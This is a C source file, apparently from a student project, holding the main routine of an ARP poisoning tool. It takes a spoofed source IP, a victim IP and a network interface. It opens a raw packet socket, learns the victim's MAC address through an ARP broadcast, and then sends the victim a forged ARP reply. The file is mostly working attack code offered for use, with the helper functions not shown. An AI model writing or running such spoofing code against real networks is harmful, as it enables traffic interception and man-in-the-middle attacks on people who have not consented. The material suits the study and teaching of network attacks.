/*
** main.c for main in /home/janel/arp_poisoning
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Thu Feb 23 14:49:38 2017 Janel
** Last update Fri Mar 23 02:06:34 2018 
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include "arp_poisoning.h"
#include "network.h"
#include "error_messages.h"

int			main(int argc, char *argv[])
{
  char			*victim_ip, *spoofed_ip_source, *interface;
  uint8_t		*my_mac_address, *victim_mac_address;
  struct sockaddr_ll	device;
  int			sd;

  if (argc != 4)
    return (usage(argv[0]), EXIT_FAILURE);
  spoofed_ip_source = argv[1]; victim_ip = argv[2]; interface = argv[3];
  if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    return (fprintf(stderr, ERROR_SOCKET_CREATION), EXIT_FAILURE);
  if (!(my_mac_address = get_my_mac_address(sd, interface)))
    return (fprintf(stderr, ERROR_GET_MAC), EXIT_FAILURE);
  memset(&device, 0, sizeof device);
  return (!(get_index_from_interface(&device, interface)
	    && send_packet_to_broadcast(sd, &device, my_mac_address, spoofed_ip_source, victim_ip)
	    && (victim_mac_address = get_victim_response(sd, victim_ip))
	    && send_payload_to_victim(sd, &device,
				      my_mac_address, spoofed_ip_source,
				      victim_mac_address, victim_ip))
	  ? (EXIT_FAILURE)
	  : (EXIT_SUCCESS));
}
